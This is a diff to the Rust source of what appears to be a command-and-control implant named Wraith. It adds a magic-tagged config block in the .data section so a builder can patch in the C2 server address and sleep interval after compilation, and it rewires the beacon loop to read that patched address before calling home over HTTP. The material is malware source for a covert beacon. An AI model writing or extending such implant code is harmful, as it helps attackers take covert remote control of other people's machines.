@@ -8,6 +8,24 @@ use snow::Builder;
 pub mod packet;
 use packet::{WraithFrame, FRAME_TYPE_DATA};
 
+// Magic signature for config patching: "WRAITH_CONFIG_BLOCK" (19 bytes)
+const CONFIG_MAGIC: [u8; 19] = *b"WRAITH_CONFIG_BLOCK";
+
+#[repr(C)]
+pub struct PatchableConfig {
+    magic: [u8; 19],
+    server_addr: [u8; 64],
+    sleep_interval: u64,
+}
+
+// Place in .data section to be writable/patchable
+#[link_section = ".data"]
+pub static mut GLOBAL_CONFIG: PatchableConfig = PatchableConfig {
+    magic: CONFIG_MAGIC,
+    server_addr: [0u8; 64], // Zeros to be patched
+    sleep_interval: 5000,
+};
+
 #[derive(Debug, Serialize, Deserialize)]
 pub enum TransportType {
     Http,
@@ -18,6 +36,34 @@ pub struct C2Config {
     pub transport: TransportType,
     pub server_addr: &'static str,
     pub sleep_interval: u64,
+}
+
+impl C2Config {
+    pub fn get_global() -> Self {
+        unsafe {
+            // Check if patched (magic matches)
+            // If magic is overwritten or we are in dev mode, use default
+            // Here we assume if first byte is 0, it's default/unpatched dev mode.
+            // Or better: In dev, we set default values. The builder overwrites them.
+            // For now, let's just return a config derived from GLOBAL_CONFIG.
+            
+            // Convert C-string to slice
+            let addr_len = GLOBAL_CONFIG.server_addr.iter().position(|&c| c == 0).unwrap_or(64);
+            let addr_str = if addr_len > 0 {
+                core::str::from_utf8_unchecked(&GLOBAL_CONFIG.server_addr[..addr_len])
+            } else {
+                "127.0.0.1"
+            };
+
+            Self {
+                transport: TransportType::Http,
+                server_addr: addr_str, // Note: lifetime issue if not static. 
+                                       // In no_std, we might need to copy to a buffer or use raw pointers.
+                                       // For this struct, we'll cheat and cast to static str because GLOBAL_CONFIG is static.
+                sleep_interval: GLOBAL_CONFIG.sleep_interval,
+            }
+        }
+    }
 }
 
 pub trait Transport {
@@ -261,7 +307,8 @@ impl Transport for HttpTransport {
     }
 }
 
-pub fn run_beacon_loop(config: C2Config) -> ! {
+pub fn run_beacon_loop(_initial_config: C2Config) -> ! {
+    let config = C2Config::get_global();
     let mut transport = HttpTransport::new(config.server_addr, 8080);
     let mut buf = [0u8; 4096];
 
